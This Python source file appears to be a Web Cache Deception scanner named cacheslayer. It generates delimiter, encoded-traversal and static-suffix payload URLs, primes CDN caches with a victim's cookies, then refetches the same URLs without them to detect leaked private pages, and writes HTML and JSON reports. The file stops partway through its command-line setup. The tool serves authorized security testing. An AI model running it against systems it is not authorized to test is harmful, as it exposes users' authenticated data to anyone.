#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
cacheslayer / web_cache_diff.py
================================
A full-featured Web Cache Deception (WCD) scanner with DIFF-mode reporting.

WHAT THIS TOOL DOES
-------------------
1) Parses an authenticated curl command (or a file containing one).
2) Sends that request to capture the authenticated "baseline" response body & headers.
3) Generates a wide set of WCD candidate payload URLs:
   - static-looking suffixes (e.g., .css, .js, images, etc.)
   - PortSwigger delimiter set (plain + percent-encoded) appended to paths
   - delimiter+suffix combos (e.g., ';test', '.test', '%2F..%2F')
   - dot-segment & encoded slash variations
   - odd extensions to tickle CDN classification
   - optional "vendor-mode" (cloudflare|fastly|akamai) for targeted heuristics
4) For each payload:
   a) PRIMES the cache as a victim (using your cookies/headers)
   b) waits a configurable time (--prime-wait)
   c) requests the same URL as an attacker (no auth headers)
   d) computes body similarity vs baseline, detects cache headers, calculates score
   e) optionally RECHECKS (prime + attacker again) to account for slow cache HITs
5) Scores & flags high-confidence WCD vulns (score >= threshold and "victim-like").
6) Produces:
   - JSON: machine-readable summary of all payloads & measurements
   - HTML: NEW layout with collapsible per-payload panels, sticky summaries, filters,
           side-by-side snippets, and unified diffs per vulnerability

SCORING
-------
score = 0.6 * body_similarity + 0.3 * (cache evidence present ? 1 : 0)
      + 0.1 * (status parity vs baseline ? 1 : 0)

DEPENDENCIES
------------
- Python 3.8+
- requests

USAGE EXAMPLES
--------------
  python3 web_cache_diff.py --curl-file auth_curl.txt --vendor-mode cloudflare \
    --threshold 0.6 --rechecks 1 --out report.json --html report.html

  python3 web_cache_diff.py --curl "<your curl line>" --html report.html --verify-ssl

SECURITY & ETHICS
-----------------
Use this tool ONLY against systems you are explicitly authorized to test.
The tool can surface sensitive user data; handle the outputs securely.

Author
------
Kullai
"""

# ============================================================================
# Imports
# ============================================================================
import argparse
import difflib
import hashlib
import html
import json
import re
import sys
import time
from copy import deepcopy
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

import requests
import urllib3


# ============================================================================
# Global setup / SSL warnings
# ============================================================================
# We default to NOT verifying SSL (labs commonly use self-signed certs).
# You can enable strict verification with --verify-ssl.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ============================================================================
# Console color helpers (pretty printing)
# ============================================================================
class C:
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    CYAN = "\033[36m"
    BOLD = "\033[1m"
    RESET = "\033[0m"

def c_ok(s): return f"{C.GREEN}{s}{C.RESET}"
def c_warn(s): return f"{C.YELLOW}{s}{C.RESET}"
def c_bad(s): return f"{C.RED}{s}{C.RESET}"
def c_info(s): return f"{C.CYAN}{s}{C.RESET}"
def c_head(s): return f"{C.BOLD}{s}{C.RESET}"


# ============================================================================
# Payload families (base)
# ============================================================================
# 1) Static-like suffixes that often trigger CDN cache classification:
BASE_FILE_SUFFIXES = [
    "attacker.jpg", "attacker.png", "attacker.css", "attacker.js",
    "attacker.txt", "attacker.webp", "index.html", "attacker.svg", "evil.json"
]

# 2) Classic delimiter tricks used in WCD writeups and PortSwigger labs:
BASE_DELIMS = [
    ";", ";test", ".test",
    "%2F..%2F", "%2F.%2F", "/..%2F",
    "%2E%2E%2F", "%5C..%5C", "..%2F", "%2F%2E%2E%2F"
]

# 3) Dot-segment / traversal-like variants:
BASE_DOTSEG = [
    "/../", "/%2E%2E/", "/a/../", "/a%2F..%2F"
]

# 4) Odd/rare extensions (sometimes classified as static by CDNs):
BASE_ODD_EXTS = [
    "file.avif", "file.webp", "file.x", "file.unknownext", "file.woff2"
]


# ============================================================================
# PortSwigger delimiter list (plain + percent-encoded)
# ============================================================================
# Source: PortSwigger Web Cache Deception delimiter lists.
PORTSWIGGER_DELIMITERS = [
    "!", '"', "#", "$", "%", "&", "'", "(", ")", "*", "+", ",", "-", ".", "/", ":",
    ";", "<", "=", ">", "?", "@", "[", "\\", "]", "^", "_", "`", "{", "|", "}", "~"
]

PORTSWIGGER_ENCODED = [
    "%21","%22","%23","%24","%25","%26","%27","%28","%29","%2A","%2B","%2C","%2D","%2E","%2F",
    "%3A","%3B","%3C","%3D","%3E","%3F","%40","%5B","%5C","%5D","%5E","%5F","%60","%7B","%7C","%7D","%7E"
]

# We will prefer some delimiters earlier because they emulate "static-ish" paths:
PREFERRED_DELIMS = [".", "-", "_", ";"]


# ============================================================================
# Vendor heuristics (Cloudflare, Fastly, Akamai)
# ============================================================================
VENDOR_PROFILES = {
    "cloudflare": {
        # common static-like extensions Cloudflare is eager to cache
        "extensions": ["js", "css", "json", "ico", "jpg", "png", "svg", "webp"],
        # path "patterns" that might influence caching / keying
        "patterns": ["?cf_cache=true", ";cdn-cache", "/.cf-assets/"],
        "note": "Cloudflare aggressively caches static extensions and may downplay some query strings."
    },
    "fastly": {
        "extensions": ["woff2", "svg", "txt", "json", "css", "js"],
        "patterns": [";version=1", ";v=1", "?fastly=1"],
        "note": "Fastly commonly preserves semicolon params in cache keys."
    },
    "akamai": {
        "extensions": ["html", "asp", "php", "css", "js"],
        "patterns": ["/..;/", "%2F..%2F", "/;jsessionid="],
        "note": "Akamai normalizations on encoded slashes and dot-segments can lead to mismatches."
    }
}


# ============================================================================
# Data structures
# ============================================================================
@dataclass
class RequestSpec:
    """
    Parsed request from a curl line:
    - method (GET/POST/...)
    - url (absolute, https://...)
    - headers (dict)
    - data (payload for POST/PUT if any)
    - cookies (Cookie header value if supplied)
    """
    method: str
    url: str
    headers: Dict[str, str] = field(default_factory=dict)
    data: Optional[str] = None
    cookies: Optional[str] = None


@dataclass
class ResponseRecord:
    """
    Compact record of a single HTTP response:
    - url, status
    - headers (lowercased)
    - body (text), body_len, body_md5 (fingerprint)
    """
    url: str
    status: int
    headers: Dict[str, str]
    body: str
    body_len: int
    body_md5: str


@dataclass
class PayloadResult:
    """
    Result for a single tested payload URL:
    - prime_status: victim prime (status code)
    - attacker_status: unauthenticated replay (status code)
    - similarity: body similarity vs baseline (0..1)
    - score: heuristic score (0..1)
    - cache_evidence: list of cache hints (Age, X-Cache, Cf-Cache-Status, Cache-Control:max-age>0)
    - attacker_headers: normalized response headers from attacker run
    - victim_like: bool (similarity high & status parity)
    - notes: free-form (e.g., recheck attempts)
    - attacker_body_len, attacker_body_md5
    - preview_victim_snippet, preview_attacker_snippet
    - unified_diff_html: unified diff (escaped HTML) for report
    """
    payload_url: str
    prime_status: Optional[int] = None
    attacker_status: Optional[int] = None
    similarity: float = 0.0
    score: float = 0.0
    cache_evidence: List[str] = field(default_factory=list)
    attacker_headers: Dict[str, str] = field(default_factory=dict)
    victim_like: bool = False
    notes: List[str] = field(default_factory=list)
    attacker_body_len: int = 0
    attacker_body_md5: str = ""
    preview_victim_snippet: str = ""
    preview_attacker_snippet: str = ""
    unified_diff_html: str = ""


# ============================================================================
# Utility functions
# ============================================================================
def normalize_curl(curl: str) -> str:
    """
    Convert zsh $'...' quoting into simple '...' to simplify tokenization.
    """
    return re.sub(r"\$'([^']*)'", r"'\1'", curl.strip())


def parse_curl(curl: str) -> RequestSpec:
    """
    Lightweight curl parser for common cases:
      - -X / --request
      - -H / --header "Key: value"
      - -d / --data / --data-raw / --data-binary
      - -b / --cookie
      - URL
    The parser is intentionally forgiving (best-effort) to handle most real-world curl lines.
    """
    s = normalize_curl(curl)
    if s.startswith("curl "):
        s = s[5:]

    # Tokenize respecting quotes
    tokens = re.findall(r'''(?:"[^"]*"|'[^']*'|\S)+''', s)
    tokens = [t.strip('"').strip("'") for t in tokens]

    method = "GET"
    headers: Dict[str, str] = {}
    data = None
    cookies = None
    url = None

    i = 0
    while i < len(tokens):
        t = tokens[i]
        if t in ("-X", "--request"):
            i += 1
            method = tokens[i].upper()
        elif t.startswith("-X") and t != "-X":
            method = t[2:].upper()
        elif t in ("-H", "--header"):
            i += 1
            h = tokens[i]
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip()] = v.strip()
        elif t.startswith("-H") and t != "-H":
            h = t[2:]
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip()] = v.strip()
        elif t in ("-d", "--data", "--data-raw", "--data-binary"):
            i += 1
            data = tokens[i]
            if method == "GET":
                method = "POST"
        elif t in ("-b", "--cookie"):
            i += 1
            cookies = tokens[i]
        elif t.startswith("http://") or t.startswith("https://"):
            url = t
        i += 1

    if not url:
        # last-token fallback
        for t in reversed(tokens):
            if t.startswith("http://") or t.startswith("https://"):
                url = t
                break

    if not url:
        raise ValueError("Could not parse URL from provided curl.")

    # prefer 'Cookie' header if present
    if "Cookie" in headers and not cookies:
        cookies = headers["Cookie"]

    return RequestSpec(method=method, url=url, headers=headers, data=data, cookies=cookies)


def md5_of_text(s: str) -> str:
    """
    MD5 fingerprint for quick comparisons (fine for this purpose).
    """
    return hashlib.md5(s.encode("utf-8", errors="ignore")).hexdigest()


def body_similarity(a: str, b: str) -> float:
    """
    0..1 similarity using difflib's SequenceMatcher (fast, robust).
    """
    return difflib.SequenceMatcher(None, a, b).ratio()


def lower_headers(h: Dict[str, str]) -> Dict[str, str]:
    """
    Normalize header keys to lowercase for consistent lookups.
    """
    return {k.lower(): v for k, v in h.items()}


def detect_cache_headers(h: Dict[str, str]) -> List[str]:
    """
    Detect signs that a response came from cache or is cacheable:
    - Age, X-Cache, CF-Cache-Status, Via, X-Edge-Cache, X-Cache-Hits
    - Cache-Control: max-age>0 (and not max-age=0)
    """
    ev = []
    for k, v in h.items():
        kl = k.lower()
        if kl in ("age", "x-cache", "cf-cache-status", "via", "x-edge-cache", "x-cache-hits"):
            ev.append(f"{kl}:{v}")
        if kl == "cache-control" and "max-age" in v and not re.search(r"max-age=0\b", v):
            ev.append(f"{kl}:{v}")
    return ev


def preview_snippet(text: str, length: int = 360, max_lines: int = 12) -> str:
    """
    Return a short, multi-line, HTML-escaped snippet for preview boxes while keeping the original structure readable.
    """
    if not text:
        return html.escape("(empty body)")

    normalized = text.replace("\r\n", "\n").replace("\r", "\n")
    normalized = re.sub(r"\n{3,}", "\n\n", normalized).strip()
    lines = normalized.split("\n")

    if not lines:
        compact = re.sub(r"\s+", " ", text).strip()
        if len(compact) > length:
            compact = compact[:length].rstrip() + "…"
        return html.escape(compact, quote=True)

    snippet_lines: List[str] = []
    remaining = max(length, 0)
    content_lines = 0

    for raw_line in lines:
        line = raw_line.strip()

        if not line:
            if snippet_lines and snippet_lines[-1] == "":
                continue
            snippet_lines.append("")
            continue

        content_lines += 1

        if remaining > 0 and len(line) >= remaining:
            cutoff = max(remaining - 1, 1)
            snippet_lines.append(line[:cutoff].rstrip() + "…")
            remaining = 0
            break

        snippet_lines.append(line)
        remaining = max(remaining - len(line), 0)

        if content_lines >= max_lines or remaining <= 0:
            if snippet_lines:
                snippet_lines[-1] = snippet_lines[-1].rstrip("…") + "…"
            break

    snippet = "\n".join(snippet_lines).strip()

    if not snippet:
        compact = re.sub(r"\s+", " ", text).strip()
        if len(compact) > length:
            compact = compact[:length].rstrip() + "…"
        snippet = compact or "(empty body)"

    return html.escape(snippet, quote=True)


def unified_diff_html(a: str, b: str, max_lines: int = 800) -> str:
    """
    Produce a unified diff (victim → attacker) and return as HTML-escaped text.
    """
    a_lines = a.splitlines()
    b_lines = b.splitlines()
    diff_lines = list(difflib.unified_diff(a_lines, b_lines, lineterm=""))
    if len(diff_lines) > max_lines:
        diff_lines = diff_lines[:max_lines] + ["... (truncated)"]
    return html.escape("\n".join(diff_lines))


# ============================================================================
# HTTP wrapper (requests)
# ============================================================================
def do_request(session: requests.Session, method: str, url: str, headers: Dict[str, str] = None,
               data=None, timeout: int = 25, verify_ssl: bool = False) -> Tuple[Optional[requests.Response], Dict[str, str]]:
    """
    Perform an HTTP request with error handling. Returns (response, normalized_headers).
    If the request fails, returns (None, {}).
    """
    try:
        r = session.request(method=method, url=url, headers=headers, data=data,
                            allow_redirects=True, timeout=timeout, verify=verify_ssl)
        return r, lower_headers(r.headers)
    except Exception as e:
        print(c_warn(f"[!] Request error for {url}: {e}"))
        return None, {}


# ============================================================================
# Payload generation (enhanced with PortSwigger delimiters + vendor mode)
# ============================================================================
def generate_candidate_payloads(base_url: str, vendor: Optional[str] = None) -> List[str]:
    """
    Build a list of WCD candidate payload URLs.

    Strategy (in order):
      1) Append classic static suffixes to the base path.
      2) Add "classic" delimiter tricks from public research.
      3) Add dot-segment (encoded & decoded) patterns.
      4) Integrate full PortSwigger delimiter list (plain + encoded).
         - Preferred delimiters first: '.', '-', '_', ';'
         - Then all remaining delimiters (both raw and %encoded)
      5) Odd extensions
      6) Vendor-mode augmentations (Cloudflare/Fastly/Akamai):
         - prioritized attacker.{ext}
         - tail patterns specific to vendor

    NOTE: We deduplicate while preserving order, to keep the testing predictable.
    """
    base = base_url.rstrip("/")
    candidates: List[str] = []

    # -- 1) Classic static suffixes (good hit-rate in labs & real world)
    for s in BASE_FILE_SUFFIXES:
        candidates.append(f"{base}/{s}")

    # -- 2) Classic delimiter variants seen in WCD posts/labs
    for d in BASE_DELIMS:
        candidates.append(f"{base}{d}")
        candidates.append(f"{base}{d}/")

    # -- 3) Dot-segment permutations (origin vs cache normalization mismatch)
    for ds in BASE_DOTSEG:
        candidates.append(f"{base}{ds}")
        # combine a common static suffix behind dot-segment
        candidates.append(f"{base}{ds}attacker.css")

    # -- 4) PortSwigger delimiter set (prioritize preferred first)
    for d in PREFERRED_DELIMS:
        candidates.append(f"{base}{d}")
        candidates.append(f"{base}{d}test")
        candidates.append(f"{base}{d}attacker.css")
        candidates.append(f"{base}{d}/")

    # The full list (plain+encoded). Skip preferred duplicates.
    for plain, enc in zip(PORTSWIGGER_DELIMITERS, PORTSWIGGER_ENCODED):
        if plain in PREFERRED_DELIMS:
            continue
        # Append raw (where allowed by requests) and encoded forms.
        # Some raw characters like '#' or '?' would change URL semantics; the encoded variant is safe.
        try:
            candidates.append(f"{base}{plain}")
            candidates.append(f"{base}{plain}test")
        except Exception:
            # If creating that string raises (rare), just ignore raw version.
            pass
        candidates.append(f"{base}{enc}")
        candidates.append(f"{base}{enc}test")
        candidates.append(f"{base}{enc}/")

    # -- 5) Odd extensions to poke CDN mime/static heuristics
    for e in BASE_ODD_EXTS:
        candidates.append(f"{base}/{e}")

    # -- 6) Vendor-specific augmentations
    if vendor and vendor in VENDOR_PROFILES:
        profile = VENDOR_PROFILES[vendor]
        # Prepend attacker.{ext} prioritized variants
        for ext in profile.get("extensions", []):
            candidates.insert(0, f"{base}/attacker.{ext}")
        # Tail patterns appended
        for pat in profile.get("patterns", []):
            candidates.append(f"{base}{pat}")

    # Final: dedupe while preserving order
    seen = set()
    final = []
    for u in candidates:
        if u not in seen:
            final.append(u)
            seen.add(u)
    return final


# ============================================================================
# Scanner core
# ============================================================================
class WCDScanner:
    """
    Orchestrates victim/attacker sessions, baseline capture, and payload testing.
    """

    def __init__(self, req: RequestSpec, verify_ssl: bool = False,
                 prime_wait: float = 5.0, rechecks: int = 1, recheck_wait: float = 5.0,
                 threshold: float = 0.7):
        self.req = req
        self.verify_ssl = verify_ssl
        self.prime_wait = prime_wait
        self.rechecks = rechecks
        self.recheck_wait = recheck_wait
        self.threshold = threshold

        # Victim session: includes cookies/headers from the provided curl
        self.victim_session = requests.Session()
        if self.req.cookies:
            self.victim_session.headers.update({"Cookie": self.req.cookies})
        if self.req.headers:
            self.victim_session.headers.update(self.req.headers)

        # Attacker session: copy headers but strip auth/cookie
        self.attacker_session = requests.Session()
        attacker_headers = deepcopy(self.req.headers)
        for k in list(attacker_headers.keys()):
            if k.lower() in ("cookie", "authorization", "x-auth-token"):
                attacker_headers.pop(k)
        self.attacker_headers = attacker_headers

    # -----------------------------------------
    def capture_baseline(self) -> ResponseRecord:
        """
        Execute the authenticated (victim) request and store the baseline.
        """
        print(c_info("[*] Capturing baseline (authenticated) response..."))
        r, h = do_request(self.victim_session, self.req.method, self.req.url,
                          headers=self.req.headers, data=self.req.data, verify_ssl=self.verify_ssl)
        if not r:
            raise SystemExit(c_bad("[-] Failed to fetch baseline. Aborting."))
        body = r.text
        rec = ResponseRecord(
            url=self.req.url,
            status=r.status_code,
            headers=h,
            body=body,
            body_len=len(body),
            body_md5=md5_of_text(body)
        )
        print(c_ok(f"[+] Baseline captured: status={rec.status} len={rec.body_len} md5={rec.body_md5}"))
        return rec

    # -----------------------------------------
    def test_payload_once(self, payload_url: str, baseline: ResponseRecord) -> PayloadResult:
        """
        Single-cycle test for one payload:
        - prime as victim
        - pause
        - request as attacker
        - compute similarity, cache evidence, and score
        """
        notes: List[str] = []

        # Prime phase (victim)
        print(c_info(f"    [>] Priming as victim: {payload_url}"))
        rp, _ = do_request(self.victim_session, "GET", payload_url, headers=self.req.headers, verify_ssl=self.verify_ssl)
        prime_status = rp.status_code if rp else None
        notes.append(f"prime_status={prime_status}")

        # Give time for caches to ingest the object
        if self.prime_wait > 0:
            time.sleep(self.prime_wait)

        # Attacker phase
        print(c_info(f"    [>] Attacker request (no auth): {payload_url}"))
        ra, ha = do_request(self.attacker_session, "GET", payload_url, headers=self.attacker_headers, verify_ssl=self.verify_ssl)
        if not ra:
            return PayloadResult(payload_url=payload_url, prime_status=prime_status, attacker_status=None, notes=notes)

        # Compare bodies & detect cache
        attacker_body = ra.text
        similarity = body_similarity(baseline.body, attacker_body)
        cache_evd = detect_cache_headers(ha)

        # Heuristic score
        score = 0.6 * similarity
        if cache_evd:
            score += 0.3
        if ra.status_code == baseline.status:
            score += 0.1
        score = min(score, 1.0)

        victim_like = (similarity >= 0.6 and ra.status_code == baseline.status)

        # Snippets + diff for HTML
        v_prev = preview_snippet(baseline.body, length=520, max_lines=18)
        a_prev = preview_snippet(attacker_body, length=520, max_lines=18)
        u_diff = unified_diff_html(baseline.body, attacker_body, max_lines=900)

        return PayloadResult(
            payload_url=payload_url,
            prime_status=prime_status,
            attacker_status=ra.status_code,
            similarity=round(similarity, 3),
            score=round(score, 3),
            cache_evidence=cache_evd,
            attacker_headers=ha,
            victim_like=victim_like,
            notes=notes,
            attacker_body_len=len(attacker_body),
            attacker_body_md5=md5_of_text(attacker_body),
            preview_victim_snippet=v_prev,
            preview_attacker_snippet=a_prev,
            unified_diff_html=u_diff
        )

    # -----------------------------------------
    def test_payload_with_rechecks(self, payload_url: str, baseline: ResponseRecord) -> PayloadResult:
        """
        Perform the test once and then retry if inconclusive (score<threshold or no cache evidence),
        because some caching layers need an extra round before hits are visible.
        """
        result = self.test_payload_once(payload_url, baseline)
        tries = self.rechecks
        while tries > 0 and (result.score < self.threshold or not result.cache_evidence):
            print(c_warn(f"    [~] Inconclusive (score={result.score}, cache={bool(result.cache_evidence)}). Recheck in {self.recheck_wait:.1f}s..."))
            time.sleep(self.recheck_wait)
            result = self.test_payload_once(payload_url, baseline)
            tries -= 1
        return result


# ============================================================================
# HTML report (NEW layout: collapsible panels, sticky header, filtering)
# ============================================================================
def write_html_report(path: str, baseline: ResponseRecord, results: List[PayloadResult], threshold: float):
    """
    Generate a polished HTML report with:
      - Sticky summary header (target, totals, threshold)
      - Filter/search box for quick triage
      - Collapsible per-payload panels (status, headers, cache evidence, body snippets)
      - For flagged vulnerabilities: highlighted "VULNERABLE" badge and unified diff

    All content is rendered client-side (lightweight JS) — no external dependencies.
    """
    # Small helper: stringify a header dict as HTML list
    def headers_to_html(h: Dict[str, str]) -> str:
        if not h:
            return "<em>None</em>"
        items = "".join(f"<li><code>{html.escape(k)}</code>: {html.escape(str(v))}</li>" for k, v in h.items())
        return f"<ul class='kv'>{items}</ul>"

    # Count stats
    total = len(results)
    flagged = [r for r in results if r.score >= threshold and r.victim_like]
    flagged_count = len(flagged)

    # CSS (dark, clean)
    css = r"""
:root {
  --bg: #080f1f;
  --card: #0b162c;
  --muted: #94a3b8;
  --text: #e6eef6;
  --accent: #60a5fa;
  --good: #34d399;
  --bad: #f87171;
  --warn: #fbbf24;
  --code: #fbbf24;
  --line: rgba(148, 163, 184, 0.35);
}
* {
  box-sizing: border-box;
}
body {
  margin: 0;
  padding: 0;
  background: radial-gradient(circle at top left, rgba(37, 99, 235, 0.12), transparent 55%), var(--bg);
  color: var(--text);
  font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
  line-height: 1.55;
}
a {
  color: var(--accent);
  text-decoration: none;
}
h1,
h2 {
  margin: 0 0 12px 0;
}
.container {
  padding: 32px 24px 48px;
  max-width: 1200px;
  margin: 0 auto;
}
.sticky {
  position: sticky;
  top: 0;
  z-index: 50;
  backdrop-filter: blur(6px);
  background: linear-gradient(180deg, rgba(8, 15, 31, 0.95), rgba(8, 15, 31, 0.6));
  border-bottom: 1px solid var(--line);
  box-shadow: 0 18px 40px rgba(2, 6, 23, 0.45);
}
.header-grid {
  display: grid;
  grid-template-columns: auto 1fr auto;
  gap: 20px;
  align-items: center;
  padding: 16px 28px;
}
h1.title {
  color: #bfdbfe;
  font-size: 22px;
  font-weight: 600;
}
.badge {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  padding: 4px 10px;
  border-radius: 999px;
  font-size: 12px;
  border: 1px solid var(--line);
  color: var(--muted);
  background: rgba(148, 163, 184, 0.1);
}
.row {
  display: flex;
  gap: 10px;
  align-items: center;
  flex-wrap: wrap;
}
.row-between {
  justify-content: space-between;
  width: 100%;
}
.kv {
  margin: 6px 0 0 16px;
}
.card {
  background: var(--card);
  border: 1px solid var(--line);
  border-radius: 14px;
  padding: 18px;
  margin: 16px 0;
  box-shadow: 0 16px 45px rgba(8, 15, 31, 0.45);
}
.card.small {
  font-size: 12px;
  color: var(--muted);
  border-style: dashed;
}
.vuln {
  border-left: 4px solid var(--bad);
}
.ok {
  border-left: 4px solid var(--good);
}
table {
  width: 100%;
  border-collapse: collapse;
}
th,
td {
  border-bottom: 1px solid var(--line);
  padding: 8px 10px;
  text-align: left;
  vertical-align: top;
}
code {
  color: var(--code);
  font-size: 0.95em;
}
pre {
  background: #071b34;
  padding: 14px;
  border-radius: 10px;
  overflow: auto;
  color: var(--text);
  border: 1px solid rgba(96, 165, 250, 0.18);
  white-space: pre-wrap;
  word-break: break-word;
  font-family: "JetBrains Mono", "Fira Code", "SFMono-Regular", Menlo, Monaco, Consolas, "Liberation Mono", monospace;
  font-size: 13px;
  line-height: 1.45;
}
details {
  border: 1px solid var(--line);
  border-radius: 14px;
  overflow: hidden;
  background: rgba(15, 23, 42, 0.4);
}
details > summary {
  cursor: pointer;
  list-style: none;
  padding: 16px 20px;
  outline: none;
  display: flex;
  flex-direction: column;
  gap: 8px;
  background: rgba(148, 163, 184, 0.08);
  transition: background 0.2s ease;
}
details > summary::-webkit-details-marker {
  display: none;
}
details > summary:hover {
  background: rgba(96, 165, 250, 0.12);
}
details[open] > summary {
  border-bottom: 1px solid rgba(148, 163, 184, 0.25);
}
.summary-main {
  display: flex;
  align-items: center;
  gap: 14px;
  flex-wrap: wrap;
}
.summary-main .status {
  font-weight: 700;
  padding: 4px 12px;
  border-radius: 999px;
  background: rgba(59, 130, 246, 0.12);
  color: #bfdbfe;
}
.summary-main .url {
  word-break: break-all;
  padding: 4px 0;
}
.summary-meta {
  display: flex;
  flex-wrap: wrap;
  gap: 10px;
  font-size: 12px;
  color: var(--muted);
}
.summary-meta span {
  padding: 3px 9px;
  border-radius: 999px;
  background: rgba(15, 23, 42, 0.6);
  border: 1px solid rgba(148, 163, 184, 0.2);
}
.payload.vuln summary .status {
  background: rgba(248, 113, 113, 0.2);
  color: #fecaca;
}
.payload.ok summary .status {
  background: rgba(52, 211, 153, 0.18);
  color: #bbf7d0;
}
.meta-row {
  display: flex;
  gap: 10px;
  flex-wrap: wrap;
  margin: 10px 0 12px;
}
.meta-row .badge {
  background: rgba(15, 23, 42, 0.7);
}
.grid2 {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 12px;
}
.grid2 .card {
  margin: 0;
  box-shadow: none;
  border-radius: 12px;
}
.filters {
  display: flex;
  gap: 12px;
  align-items: center;
  flex-wrap: wrap;
}
input[type="search"] {
  background: #0e1a33;
  border: 1px solid var(--line);
  color: var(--text);
  padding: 8px 12px;
  border-radius: 10px;
  min-width: 260px;
}
.small {
  font-size: 12px;
  color: var(--muted);
}
.copy {
  cursor: pointer;
  border: 1px dashed var(--line);
  padding: 4px 8px;
  border-radius: 8px;
  text-transform: uppercase;
  letter-spacing: 0.04em;
  font-size: 11px;
  color: var(--muted);
  transition: all 0.2s ease;
}
.copy:hover {
  border-color: var(--accent);
  color: var(--accent);
}
.copy.copied {
  border-color: var(--accent);
  background: rgba(96, 165, 250, 0.16);
  color: #bfdbfe;
}
@media (max-width: 1100px) {
  .header-grid {
    grid-template-columns: 1fr;
  }
}
@media (max-width: 900px) {
  .grid2 {
    grid-template-columns: 1fr;
  }
}
@media (max-width: 640px) {
  .container {
    padding: 24px 16px 40px;
  }
  .summary-main {
    flex-direction: column;
    align-items: flex-start;
    gap: 8px;
  }
  input[type="search"] {
    min-width: unset;
    width: 100%;
  }
}
"""

    # Tiny JS for filtering + copy
    js = r"""
function filterRows() {
  const q = document.getElementById('q').value.toLowerCase();
  const onlyVuln = document.getElementById('onlyVuln').checked;
  const threshold = parseFloat(document.getElementById('thresholdVal').dataset.th);
  const panels = document.querySelectorAll('.payload');
  let shown = 0;

  panels.forEach(p => {
    const url = p.dataset.url.toLowerCase();
    const score = parseFloat(p.dataset.score);
    const victimlike = (p.dataset.victimlike === 'true');
    let ok = true;
    if (q && !url.includes(q)) ok = false;
    if (onlyVuln && !(score >= threshold && victimlike)) ok = false;
    p.style.display = ok ? '' : 'none';
    if (ok) shown++;
  });

  document.getElementById('shownCount').textContent = shown;
}

function copyText(txt, el) {
  if (!txt) return;
  navigator.clipboard.writeText(txt).then(() => {
    if (!el) return;
    const original = el.dataset.label || el.textContent;
    el.dataset.label = original;
    el.classList.add('copied');
    el.textContent = 'copied';
    setTimeout(() => {
      el.classList.remove('copied');
      el.textContent = el.dataset.label;
    }, 1400);
  }).catch(() => {});
}
"""

    # Build payload panels
    panels_html = []
    for idx, r in enumerate(results, 1):
        ev = ", ".join(r.cache_evidence) if r.cache_evidence else "—"
        vuln = (r.score >= threshold and r.victim_like)
        klass = "vuln" if vuln else "ok"
        status = "VULNERABLE" if vuln else "OK/Noisy"
        icon = "⚠️" if vuln else "✅"

        # headers
        attk_headers_html = headers_to_html(r.attacker_headers)
        diff_html = r.unified_diff_html.strip()
        if not diff_html:
            diff_html = html.escape("(no diff - bodies match)")

        # per-payload panel
        panels_html.append(f"""
<details class="card payload {klass}" data-url="{html.escape(r.payload_url)}"
         data-score="{r.score:.3f}" data-victimlike="{str(r.victim_like).lower()}" open>
  <summary>
    <div class="summary-main">
      <span class="status">{icon} {status}</span>
      <code class="url">{html.escape(r.payload_url)}</code>
    </div>
    <div class="summary-meta">
      <span>score {r.score:.3f}</span>
      <span>sim {r.similarity:.3f}</span>
      <span>prime {r.prime_status or '-'}</span>
      <span>atk {r.attacker_status or '-'}</span>
    </div>
  </summary>

  <div class="meta-row small">
    <span class="badge">cache: {html.escape(ev)}</span>
    <span class="badge">victim-like: {str(r.victim_like).lower()}</span>
    <span class="badge">md5: {r.attacker_body_md5}</span>
    <span class="badge">len: {r.attacker_body_len}</span>
  </div>

  <div class="grid2">
    <div class="card">
      <div class="row row-between">
        <div><b>Victim snippet</b></div>
        <div class="copy" data-label="copy" onclick="copyText(this.parentNode.parentNode.nextElementSibling.textContent, this)">copy</div>
      </div>
      <pre>{r.preview_victim_snippet}</pre>
    </div>
    <div class="card">
      <div class="row row-between">
        <div><b>Attacker snippet</b></div>
        <div class="copy" data-label="copy" onclick="copyText(this.parentNode.parentNode.nextElementSibling.textContent, this)">copy</div>
      </div>
      <pre>{r.preview_attacker_snippet}</pre>
    </div>
  </div>

  <div class="card">
    <b>Attacker response headers</b>
    {attk_headers_html}
  </div>

  <div class="card">
    <b>Unified diff (victim → attacker)</b>
    <pre>{diff_html}</pre>
  </div>
</details>
""")

    # Summary header
    header_html = f"""
<div class="sticky">
  <div class="header-grid">
    <div>
      <h1 class="title">cacheslayer — Web Cache Deception report</h1>
      <div class="small">Target: <code>{html.escape(baseline.url)}</code></div>
    </div>
    <div class="filters">
      <input id="q" type="search" placeholder="Filter by URL…" oninput="filterRows()">
      <label class="row small" style="gap:6px">
        <input id="onlyVuln" type="checkbox" onchange="filterRows()"> Only vulnerabilities
      </label>
      <span id="thresholdVal" class="badge" data-th="{threshold:.2f}">threshold: {threshold:.2f}</span>
      <span class="badge">baseline: {baseline.status} • md5: {baseline.body_md5}</span>
    </div>
    <div class="row">
      <span class="badge">flagged: {flagged_count}</span>
      <span class="badge">total: {total}</span>
      <span class="badge">shown: <span id="shownCount">{total}</span></span>
    </div>
  </div>
</div>
"""

    # Assemble final HTML
    doc = f"""<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>cacheslayer — WCD report</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>{css}</style>
</head>
<body>
  {header_html}
  <div class="container">
    {"".join(panels_html) if panels_html else "<div class='card'>No results.</div>"}
    <div class="card small">
      Scoring: <code>0.6×similarity + 0.3×cache evidence + 0.1×status parity</code>.
      A payload is flagged when <code>score ≥ threshold</code> and <code>victim_like = true</code>.
    </div>
  </div>
  <script>{js}</script>
</body>
</html>"""

    with open(path, "w", encoding="utf-8") as fh:
        fh.write(doc)


# ============================================================================
# CLI orchestrator
# ============================================================================
def main():
    parser = argparse.ArgumentParser(
        description="cacheslayer — Web Cache Deception scanner (DIFF mode, new HTML layout)"
    )
    src = parser.add_mutually_exclusive_group(required=True)
    src.add_argument("--curl", help="The authenticated curl command (single-line).")
    src.add_argument("--curl-file", help="Path to a file containing the authenticated curl command.")

